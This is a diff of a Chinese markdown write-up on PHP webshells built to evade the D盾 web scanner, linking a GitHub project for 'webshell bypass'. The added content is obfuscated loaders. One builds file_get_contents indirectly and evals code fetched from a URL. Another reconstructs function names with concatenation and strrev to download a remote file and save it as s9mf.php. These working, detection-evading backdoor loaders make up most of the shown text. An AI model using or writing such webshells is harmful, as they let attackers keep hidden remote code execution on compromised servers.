@@ -314,7 +314,7 @@ D盾_Web查杀
 ### 注意
 下面开始的代码，只能用txt文字，不支持Gif/图片。
 
-### remote2
+### remote2  
 ```php
 <?php
     $s9 = "687474703a2f2f6c6f63616c686f73742f746573742f6f6b6f6b2e747874";
@@ -324,8 +324,28 @@ D盾_Web查杀
 
 ### remote3
 ```php
+<?php
+$a = str_ireplace("fuck","et_contents","file_gfuck");
+$c = "a";
+$b= $$c('http://localhost/test/okok.txt');
+eval($d=&$b);
 
 ```
+
+## 远程下载
+- - -
+```php
+<?php
+$a = 'http://www.xx.com/s9mf.txt';
+$b = 'file'.'_g'.'et_'.'contents';
+$b = $b($a);
+$c = strrev('stnetnoc_tup_elif');
+$c('s9mf.php', $b);
+?>
+```
+
+## 最后
+所以代码都会上传[Github项目](https://github.com/S9MF/S9MF-php-webshell-bypass)，感兴趣的朋友可以看看，持续更新。
 
 
 
